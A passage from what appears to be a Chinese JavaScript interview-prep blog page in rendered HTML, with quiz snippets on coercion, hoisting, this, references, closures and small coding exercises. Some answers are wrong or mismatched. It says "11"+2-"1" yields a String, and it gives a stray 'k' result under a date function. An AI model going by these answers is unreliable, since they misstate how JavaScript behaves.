class="literal">NaN</span> == <span class="literal">NaN</span>;  <span class="comment">// false</span></span><br><span class="line">[] == <span class="literal">false</span>; <span class="comment">// true</span></span><br><span class="line">[] == ![];   <span class="comment">// true</span></span><br></pre></td></tr></table></figure><blockquote><p>undefined 与 null 相等，但不恒等（===）<br>一个是 number 一个是string时，会尝试将 string 转换为 number<br>尝试将 boolean 转换为number，0或1<br>尝试将 Object 转换成 number 或 string ，取决于另外一个对比量的类型<br>所以，对于0、空字符串的判断，建议使用 “===”<br>“===”会先判断两边的值类型，类型不匹配时为 false。</p></blockquote><h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> foo = <span class="string">"11"</span> + <span class="number">2</span> - <span class="string">"1"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(foo);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> foo);</span><br></pre></td></tr></table></figure><p>执行完后foo的值为111，foo的类型为String。</p><h3 id="词法作用域"><a href="#词法作用域" class="headerlink" title="词法作用域"></a>词法作用域</h3><h4 id="1"><a href="#1" class="headerlink" title="(1)"></a>(1)</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; <span class="number">10</span>, j &lt; <span class="number">6</span>; i++, j++) &#123;</span><br><span class="line">  k = i + j;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2"><a href="#2" class="headerlink" title="(2)"></a>(2)</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> tmp = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">this</span>.x = <span class="number">3</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(tmp);    <span class="comment">//A</span></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.x)；<span class="comment">//B</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> f1(); <span class="comment">//1</span></span><br><span class="line"><span class="built_in">console</span>.log(obj.x) <span class="comment">//2</span></span><br><span class="line"><span class="built_in">console</span>.log(f1()); <span class="comment">//3</span></span><br></pre></td></tr></table></figure><blockquote><p>这里实例话化了 f1 这个类。相当于执行了 f1 函数。所以这个时候 A 会输出 1<br>而 B 这个时候的 this 代表的是实例化的当前对象 obj B 输出 3。代码（2）毋庸置疑会输出 3.<br>重点 代码（3）首先这里将不再是一个类，它只是一个函数。那么 A 输出 1，B呢？<br>这里的this 代表的其实就是 window 对象，那么 this.x 就是一个全局变量,相当于在外部的一个全局变量。所以 B 输出 3。<br>最后代码由于 f 没有返回值那么一个函数如果没返回值的话，将会返回 underfined ，<br>所以答案就是: 1, 3, 3, 1, 3, underfined。</p></blockquote><h4 id="3"><a href="#3" class="headerlink" title="(3)"></a>(3)</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">6</span>;</span><br><span class="line">setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;    </span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">666</span>;</span><br><span class="line">  alert(a);      <span class="comment">// 输出666，</span></span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure><blockquote><p>因为var a = 666;定义了局部变量a，并且赋值为666，根据变量作用域链，全局变量处在作用域末端，优先访问了局部变量，从而覆盖了全局变量 。</p></blockquote><h4 id="4"><a href="#4" class="headerlink" title="(4)"></a>(4)</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">6</span>;</span><br><span class="line">setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;    </span><br><span class="line">  alert(a);  <span class="comment">// 输出undefined </span></span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">666</span>;</span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure><h4 id="5"><a href="#5" class="headerlink" title="(5)"></a>(5)</h4><blockquote><p>因为var a = 666;定义了局部变量a，同样覆盖了全局变量，但是在alert(a);之前a并未赋值，所以输出undefined。</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">6</span>; </span><br><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(a);</span><br><span class="line">    <span class="keyword">var</span> a = <span class="number">66</span>; </span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br><span class="line">a = <span class="number">666</span>; </span><br><span class="line">alert(a); </span><br><span class="line"><span class="comment">// 666, undefined;</span></span><br></pre></td></tr></table></figure><p>记住： 异步处理，一切 OK 声明提前</p><h4 id="5-1"><a href="#5-1" class="headerlink" title="(5)"></a>(5)</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setN</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">  obj.name=<span class="string">'屌丝'</span>;</span><br><span class="line">  obj = <span class="keyword">new</span> <span class="built_in">Object</span>(); </span><br><span class="line">  obj.name = <span class="string">'腐女'</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> per = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">setN(per);</span><br><span class="line">alert(per.name);  <span class="comment">//屌丝 内部</span></span><br></pre></td></tr></table></figure><h4 id="6"><a href="#6" class="headerlink" title="(6)"></a>(6)</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> foo = <span class="number">1</span>;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(foo);</span><br><span class="line">    <span class="keyword">var</span> foo = <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(foo);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><blockquote><p>输出undefined 和 2。</p></blockquote><p>上面代码相当于：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> foo = <span class="number">1</span>;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> foo;</span><br><span class="line">    <span class="built_in">console</span>.log(foo); <span class="comment">//undefined</span></span><br><span class="line">    foo = <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(foo); <span class="comment">// 2;   </span></span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><blockquote><p>函数声明与变量声明会被JavaScript引擎隐式地提升到当前作用域的顶部<br>但是只提升名称不会提升赋值部分</p></blockquote><h4 id="7"><a href="#7" class="headerlink" title="(7)"></a>(7)</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    foo.a = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; alert(<span class="number">1</span>); &#125;; </span><br><span class="line">    <span class="keyword">this</span>.a = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; alert(<span class="number">2</span>); &#125;;</span><br><span class="line">    a = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; alert(<span class="number">3</span>); &#125;;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; alert(<span class="number">4</span>); &#125;;</span><br><span class="line">&#125;; </span><br><span class="line">foo.prototype.a = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;alert(<span class="number">5</span>);&#125;;</span><br><span class="line">foo.a = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;alert(<span class="number">6</span>);&#125;;</span><br><span class="line">foo.a(); <span class="comment">//6</span></span><br><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> foo();</span><br><span class="line">obj.a(); <span class="comment">//2</span></span><br><span class="line">foo.a(); <span class="comment">//1</span></span><br></pre></td></tr></table></figure><h4 id="7-1"><a href="#7-1" class="headerlink" title="(7)"></a>(7)</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">5</span>; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    a = <span class="number">0</span>; </span><br><span class="line">    alert(a); </span><br><span class="line">    alert(<span class="keyword">this</span>.a); <span class="comment">//没有定义 a这个属性</span></span><br><span class="line">    <span class="keyword">var</span> a; </span><br><span class="line">    alert(a)</span><br><span class="line">&#125;</span><br><span class="line">test(); <span class="comment">// 0, 5, 0</span></span><br><span class="line"><span class="keyword">new</span> test(); <span class="comment">// 0, undefined, 0 //由于类它自身没有属性a， 所以是undefined</span></span><br></pre></td></tr></table></figure><h3 id="引用类型"><a href="#引用类型" class="headerlink" title="引用类型"></a>引用类型</h3><h4 id="1-1"><a href="#1-1" class="headerlink" title="(1)"></a>(1)</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">a.value = <span class="number">1</span>;</span><br><span class="line">b = a;</span><br><span class="line">b.value = <span class="number">2</span>;</span><br><span class="line">alert(a.value); <span class="comment">// 2</span></span><br></pre></td></tr></table></figure><h4 id="2-1"><a href="#2-1" class="headerlink" title="(2)"></a>(2)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var o1 = new Object();</span><br><span class="line">var o2 = o1;</span><br><span class="line">o2.name = &quot;CSSer&quot;;</span><br><span class="line">console.log(o1.name);</span><br></pre></td></tr></table></figure><blockquote><p>如果不看答案，你回答真确了的话，那么说明你对javascript的数据类型了解的还是比较清楚了。js中有两种数据类型，分别是：基本数据类型和引用数据类型（object Array）。对于保存基本类型值的变量，变量是按值访问的，因为我们操作的是变量实际保存的值。对于保存引用类型值的变量，变量是按引用访问的，我们操作的是变量值所引用（指向）的对象。答案就清楚了： //CSSer;</p></blockquote><h4 id="3-1"><a href="#3-1" class="headerlink" title="(3)"></a>(3)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function changeObjectProperty (o) &#123;</span><br><span class="line">  o.siteUrl = &quot;http://www.csser.com/&quot;;</span><br><span class="line">  o = new Object();</span><br><span class="line">  o.siteUrl = &quot;http://www.popcg.com/&quot;;</span><br><span class="line">&#125;</span><br><span class="line">var CSSer = new Object();</span><br><span class="line">changeObjectProperty(CSSer);</span><br><span class="line">console.log(CSSer.siteUrl); //</span><br></pre></td></tr></table></figure><p>如果CSSer参数是按引用传递的，那么结果应该是<code>http://www.popcg.com/</code>，但实际结果却仍是<code>http://www.csser.com/</code>。事实是这样的：在函数内部修改了引用类型值的参数，该参数值的原始引用保持不变。我们可以把参数想象成局部变量，当参数被重写时，这个变量引用的就是一个局部变量，局部变量的生存期仅限于函数执行的过程中，函数执行完毕，局部变量即被销毁以释放内存。</p><blockquote><p>补充：内部环境可以通过作用域链访问所有的外部环境中的变量对象，但外部环境无法访问内部环境。<br>每个环境都可以向上搜索作用域链，以查询变量和函数名，反之向下则不能。</p></blockquote><h3 id="JS的继承性"><a href="#JS的继承性" class="headerlink" title="JS的继承性"></a>JS的继承性</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.color = <span class="string">'red'</span>;</span><br><span class="line"><span class="keyword">var</span> o = &#123;<span class="attr">color</span>: <span class="string">'blue'</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayColor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  alert(<span class="keyword">this</span>.color);</span><br><span class="line">&#125;</span><br><span class="line">sayColor(); <span class="comment">//red</span></span><br><span class="line">sayColor.call(<span class="keyword">this</span>); <span class="comment">//red this-window对象</span></span><br><span class="line">sayColor.call(<span class="built_in">window</span>); <span class="comment">//red</span></span><br><span class="line">sayColor.call(o); <span class="comment">//blue</span></span><br></pre></td></tr></table></figure><h3 id="精度问题-JS-精度不能精确到-0-1"><a href="#精度问题-JS-精度不能精确到-0-1" class="headerlink" title="精度问题: JS 精度不能精确到 0.1"></a>精度问题: JS 精度不能精确到 0.1</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> n = <span class="number">0.3</span>,m = <span class="number">0.2</span>, i = <span class="number">0.2</span>, j = <span class="number">0.1</span>;</span><br><span class="line">alert((n - m) == (i - j)); <span class="comment">//false</span></span><br><span class="line">alert((n-m) == <span class="number">0.1</span>); <span class="comment">//false</span></span><br><span class="line">alert((i-j)==<span class="number">0.1</span>); <span class="comment">//true</span></span><br></pre></td></tr></table></figure><h3 id="加减运算"><a href="#加减运算" class="headerlink" title="加减运算"></a>加减运算</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">alert(&apos;5&apos;+3); //53 string</span><br><span class="line">alert(&apos;5&apos;+&apos;3&apos;); //53 string</span><br><span class="line">alert(&apos;5&apos;-3); //2 number</span><br><span class="line">alert(&apos;5&apos;-&apos;3&apos;); //2 number</span><br></pre></td></tr></table></figure><h3 id="foo-foo-bar"><a href="#foo-foo-bar" class="headerlink" title="foo = foo||bar"></a>foo = foo||bar</h3><p>foo = foo||bar，这行代码是什么意思？为什么要这样写？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!foo) foo = bar; //如果foo存在，值不变，否则把bar的值赋给foo</span><br></pre></td></tr></table></figure><p>短路表达式：</p><blockquote><p>作为 “&amp;&amp;” 和 “||” 操作符的操作数表达式，这些表达式在进行求值时，只要最终的结果已经可以确定是真或假，求值过程便告终止，这称之为短路求值。</p></blockquote><h3 id="闭包一个例子"><a href="#闭包一个例子" class="headerlink" title="闭包一个例子"></a>闭包一个例子</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for(var i=1;i&lt;=3;i++)&#123;</span><br><span class="line">  setTimeout(function()&#123;</span><br><span class="line">      console.log(i);    </span><br><span class="line">  &#125;,0);  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>结果：4 4 4<br>原因：JavaScript 事件处理器在线程空闲之前不会运行。如何让上述代码输出1 2 3？</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">1</span>;i&lt;=<span class="number">3</span>;i++)&#123;</span><br><span class="line">   setTimeout((<span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;  <span class="comment">//改成立即执行函数</span></span><br><span class="line">       <span class="built_in">console</span>.log(a);    </span><br><span class="line">   &#125;)(i), <span class="number">0</span>);  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="a-和-a"><a href="#a-和-a" class="headerlink" title="++a 和 a++"></a>++a 和 a++</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var a=10, b=20 , c=30;</span><br><span class="line">++a;</span><br><span class="line">a++;</span><br><span class="line">e=++a+(++b)+(c++)+a++;</span><br><span class="line">alert(e); // 77</span><br></pre></td></tr></table></figure><h3 id="日期函数"><a href="#日期函数" class="headerlink" title="日期函数"></a>日期函数</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">DateDemo</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> d, s=<span class="string">"今天日期是："</span>;</span><br><span class="line">  d = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">  s += d.getMonth() +<span class="number">1</span>+ <span class="string">"/"</span>;</span><br><span class="line">  s += d.getDate() + <span class="string">"/"</span>;</span><br><span class="line">  s += d.getFullYear();</span><br><span class="line">  <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>k 的结果：10</p></blockquote><h3 id="数组-concat-方法"><a href="#数组-concat-方法" class="headerlink" title="数组 concat() 方法"></a>数组 concat() 方法</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>);</span><br><span class="line">arr[<span class="number">4</span>]=<span class="string">'z'</span>;</span><br><span class="line">arr2 = arr.reverse();</span><br><span class="line">arr3 = arr.concat(arr2);</span><br><span class="line">alert(arr3); <span class="comment">// z,,5,3,1,z,,5,3,1</span></span><br></pre></td></tr></table></figure><h2 id="24、编程题"><a href="#24、编程题" class="headerlink" title="24、编程题"></a>24、编程题</h2><h3 id="计算字符串字节数"><a href="#计算字符串字节数" class="headerlink" title="计算字符串字节数"></a>计算字符串字节数</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="function"><span class="keyword">function</span>(<span class="params">s</span>)</span>&#123; </span><br><span class="line">   <span class="keyword">if</span>(!<span class="built_in">arguments</span>.length||!s) <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">   <span class="keyword">if</span>(<span class="string">""</span>==s) <span class="keyword">return</span> <span class="number">0</span>;     </span><br><span class="line">   <span class="keyword">var</span> l=<span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;s.length;i++)&#123;        </span><br><span class="line">       <span class="keyword">if</span>(s.charCodeAt(i)&gt;<span class="number">255</span>) l+=<span class="number">2</span>; <span class="keyword">else</span> l+=<span class="number">1</span>;  <span class="comment">//charCodeAt()得到的是unCode码   </span></span><br><span class="line">   &#125;     <span class="comment">//汉字的unCode码大于 255bit 就是两个字节</span></span><br><span class="line">   alert(l); </span><br><span class="line">&#125;(<span class="string">"hello world!"</span>);</span><br></pre></td></tr></table></figure><h3 id="join"><a href="#join" class="headerlink" title="join()"></a>join()</h3><p>已知数组 var stringArray = [“This”, “is”, “Baidu”, “Campus”]; alert 出”This is Baidu Campus”。</p><blockquote><p>alert(stringArray.join(“ “));</p></blockquote><h3 id="charAt-0-、toUpperCase"><a href="#charAt-0-、toUpperCase" class="headerlink" title="charAt(0)、toUpperCase()"></a>charAt(0)、toUpperCase()</h3><p>已知有字符串<code>foo=&quot;get-element-by-id&quot;</code>,写一个 function 将其转化成驼峰表示法 “getElementById”。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">combo</span>(<span class="params">msg</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> arr=msg.split(<span class="string">"-"</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">1</span>;i&lt;arr.length;i++)&#123;</span><br><span class="line">    arr[i]=arr[i].charAt(<span class="number">0</span>).toUpperCase()+arr[i].substr(<span class="number">1</span>,arr[i].length<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  msg=arr.join(<span class="string">""</span>);</span><br><span class="line">  <span class="keyword">return</span> msg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="数组倒排"><a href="#数组倒排" class="headerlink" title="数组倒排"></a>数组倒排</h3><p><code>var numberArray = [3,6,2,4,1,5];</code></p><p>1) 实现对该数组的倒排，输出[5,1,4,2,6,3]</p><blockquote><p>numberArray.reverse()</p></blockquote><p>2) 实现对该数组的降序排列，输出[6,5,4,3,2,1]</p><blockquote><p>numberArray.sort(function(a,b){return b-a});</p></blockquote><h3 id="日期-Date"><a href="#日期-Date" class="headerlink" title="日期 Date()"></a>日期 Date()</h3><p>输出今天的日期，以 YYYY-MM-DD 的方式，比如今天是 2015 年 7 月 14 日，则输出 2015-07-14</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line"><span class="comment">// 获取年，getFullYear()返回4位的数字</span></span><br><span class="line"><span class="keyword">var</span> year = d.getFullYear();</span><br><span class="line"><span class="comment">// 获取月，月份比较特殊，0是1月，11是12月</span></span><br><span class="line"><span class="keyword">var</span> month = d.getMonth() + <span class="number">1</span>;</span><br><span class="line"><span class="comment">// 变成两位</span></span><br><span class="line">month = month &lt; <span class="number">10</span> ? <span class="string">'0'</span> + month : month;</span><br><span class="line"><span class="comment">// 获取日</span></span><br><span class="line"><span class="keyword">var</span> day = d.getDate();</span><br><span class="line">day = day &lt; <span class="number">10</span> ? <span class="string">'0'</span> + day : day;</span><br><span class="line">alert(year + <span class="string">'-'</span> + month + <span class="string">'-'</span> + day);</span><br></pre></td></tr></table></figure><h3 id="正则替换"><a href="#正则替换" class="headerlink" title="正则替换"></a>正则替换</h3><p>将字符串<code>&quot;&lt;tr&gt;&lt;td&gt;{$id}&lt;/td&gt;&lt;td&gt;{$name}&lt;/td&gt;&lt;/tr&gt;&quot;</code>中的<code>{$id}</code>替换成10，<code>{$name}</code>替换成 <code>Tony</code>（使用正则表达式）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&lt;tr&gt;&lt;td&gt;&#123;$id&#125;&lt;/td&gt;&lt;td&gt;&#123;$id&#125;_&#123;$name&#125;&lt;/td&gt;&lt;/tr&gt;&quot;.replace(/&#123;\$id&#125;/g, &apos;10&apos;).replace(/&#123;\$name&#125;/g, &apos;Tony&apos;);</span><br></pre></td></tr></table></figure><h3 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h3><p>为了保证页面输出安全，我们经常需要对一些特殊的字符进行转义，请写一个函数 escapeHtml，将<code>&lt;, &gt;, &amp;, “</code>进行转义</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> str.replace(<span class="regexp">/[&lt;&gt;"&amp;]/g</span>, <span class="function"><span class="keyword">function</span>(<span class="params">match</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (match) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">"&lt;"</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&amp;lt;"</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">"&gt;"</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&amp;gt;"</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">"&amp;"</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&amp;amp;"</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">"\""</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&amp;quot;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="随机数"><a href="#随机数" class="headerlink" title="随机数"></a>随机数</h3><p>用 js 实现随机选取 10–100 之间的 10 个数字，存入一个数组，并排序。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">randomNub</span>(<span class="params">aArray, len, min, max</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (len &gt;= (max - min)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'超过'</span> + min + <span class="string">'-'</span> + max + <span class="string">'之间的个数范围'</span> + (max - min - <span class="number">1</span>) + <span class="string">'个的总数'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (aArray.length &gt;= len) &#123;</span><br><span class="line">    aArray.sort(<span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> a - b</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> aArray;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> nowNub = <span class="built_in">parseInt</span>(<span class="built_in">Math</span>.random() * (max - min - <span class="number">1</span>)) + (min + <span class="number">1</span>);</span><br><span class="line">  <span 